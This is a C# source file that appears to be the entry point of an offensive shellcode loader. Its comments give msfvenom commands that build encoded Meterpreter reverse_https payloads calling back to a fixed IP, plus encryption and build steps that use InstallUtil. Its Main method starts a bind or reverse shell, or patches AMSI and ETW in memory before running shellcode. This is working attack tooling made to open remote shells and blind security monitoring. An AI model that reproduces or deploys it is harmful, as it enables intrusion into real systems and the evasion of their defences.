// msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.112 LPORT=443 EXITFUNC=thread --encoder x86/shikata_ga_nai -i 9 -f raw -o shellcode32.bin
// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.112 LPORT=443 EXITFUNC=thread --encoder x64/xor_dynamic -i 9 -f raw -o shellcode64.bin
// python3 encrypt.py
// mcs main.cs patcher.cs utility.cs runner.cs installutil.cs /reference:System.Management.Automation.dll /reference:System.Configuration.Install.dll

public class main
{
    public static void Main()
    {
        if (Uninstaller.shellType == "bind")
            Uninstaller.ExecuteBindShell();
        else if (Uninstaller.shellType == "reverse")
            Uninstaller.ExecuteReverseShell();
        else
        {
            MemoryPatcher.PatchAMSI();
            MemoryPatcher.PatchETW();
            ShellcodeRunner.RunShellcode();
        }
    }
}